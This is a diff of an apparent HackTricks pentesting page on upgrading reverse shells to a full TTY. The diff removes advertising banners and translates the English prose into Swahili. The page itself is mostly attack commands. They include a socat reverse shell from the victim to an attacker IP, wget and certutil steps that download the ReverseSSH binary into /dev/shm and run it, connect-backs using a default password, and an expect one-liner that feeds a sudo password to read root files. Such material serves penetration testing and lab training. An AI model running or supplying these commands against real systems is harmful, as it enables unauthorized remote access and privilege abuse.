@@ -2,36 +2,25 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 ## Full TTY
 
-Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
+Kumbuka kwamba shell uliyoweka katika mabadiliko ya `SHELL` **lazima** iwe **imeorodheshwa ndani ya** _**/etc/shells**_ au `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Pia, kumbuka kwamba vipande vifuatavyo vinatumika tu katika bash. Ikiwa uko katika zsh, badilisha kuwa bash kabla ya kupata shell kwa kukimbia `bash`.
 
 #### Python
-
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
-
 > [!NOTE]
-> You can get the **number** of **rows** and **columns** executing **`stty -a`**
+> Unaweza kupata **nambari** ya **safu** na **nguzo** kwa kutekeleza **`stty -a`**
 
 #### script
-
 ```bash
 script /dev/null -qc /bin/bash #/dev/null is to not store anything
 (inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
-
 #### socat
-
 ```bash
 #Listener:
 socat file:`tty`,raw,echo=0 tcp-listen:4444
@@ -39,7 +28,6 @@ socat file:`tty`,raw,echo=0 tcp-listen:4444
 #Victim:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 ```
-
 ### **Spawn shells**
 
 - `python -c 'import pty; pty.spawn("/bin/sh")'`
@@ -57,39 +45,32 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 ## ReverseSSH
 
-A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
+Njia rahisi ya kupata **interactive shell access**, pamoja na **file transfers** na **port forwarding**, ni kuweka server ya ssh iliyo na uhusiano wa moja kwa moja [ReverseSSH](https://github.com/Fahrj/reverse-ssh) kwenye lengo.
 
-Below is an example for `x86` with upx-compressed binaries. For other binaries, check [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hapa kuna mfano wa `x86` wenye binaries zilizoshinikizwa na upx. Kwa binaries nyingine, angalia [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
-1. Prepare locally to catch the ssh port forwarding request:
-
+1. Andaa mahali ili kukamata ombi la port forwarding la ssh:
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 
 /dev/shm/reverse-ssh -v -l -p 4444
 ```
-
-- (2a) Linux target:
-
+- (2a) Lengo la Linux:
 ```bash
 # Drop it via your preferred way, e.g.
 wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
 
 /dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
 ```
-
-- (2b) Windows 10 target (for earlier versions, check [project readme](https://github.com/Fahrj/reverse-ssh#features)):
-
+- (2b) Lengo la Windows 10 (kwa toleo za awali, angalia [project readme](https://github.com/Fahrj/reverse-ssh#features)):
 ```bash
 # Drop it via your preferred way, e.g.
 certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe
 
 reverse-ssh.exe -p 4444 kali@10.0.0.2
 ```
-
-- If the ReverseSSH port forwarding request was successful, you should now be able to log in with the default password `letmeinbrudipls` in the context of the user running `reverse-ssh(.exe)`:
-
+- Ikiwa ombi la kupeleka bandari ya ReverseSSH lilifanikiwa, sasa unapaswa kuwa na uwezo wa kuingia kwa kutumia nenosiri la kawaida `letmeinbrudipls` katika muktadha wa mtumiaji anayekimbia `reverse-ssh(.exe)`:
 ```bash
 # Interactive shell access
 ssh -p 8888 127.0.0.1
@@ -97,25 +78,16 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
-
 ## Penelope
 
-[Penelope](https://github.com/brightio/penelope) automatically upgrades Linux reverse shells to TTY, handles the terminal size, logs everything and much more. Also it provides readline support for Windows shells.
+[Penelope](https://github.com/brightio/penelope) inasasisha kiotomatiki Linux reverse shells kuwa TTY, inashughulikia ukubwa wa terminal, inarekodi kila kitu na mengi zaidi. Pia inatoa msaada wa readline kwa Windows shells.
 
 ![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
 
 ## No TTY
 
-If for some reason you cannot obtain a full TTY you **still can interact with programs** that expect user input. In the following example, the password is passed to `sudo` to read a file:
-
+Ikiwa kwa sababu fulani huwezi kupata TTY kamili unaweza **bado kuingiliana na programu** zinazotarajia pembejeo ya mtumiaji. Katika mfano ufuatao, nenosiri linapitishwa kwa `sudo` kusoma faili:
 ```bash
 expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
 ```
-
-<figure><img src="../../images/image (2).png" alt=""><figcaption></figcaption></figure>
-
-Deepen your expertise in **Mobile Security** with 8kSec Academy. Master iOS and Android security through our self-paced courses and get certified:
-
-{% embed url="https://academy.8ksec.io/" %}
-
 {{#include ../../banners/hacktricks-training.md}}
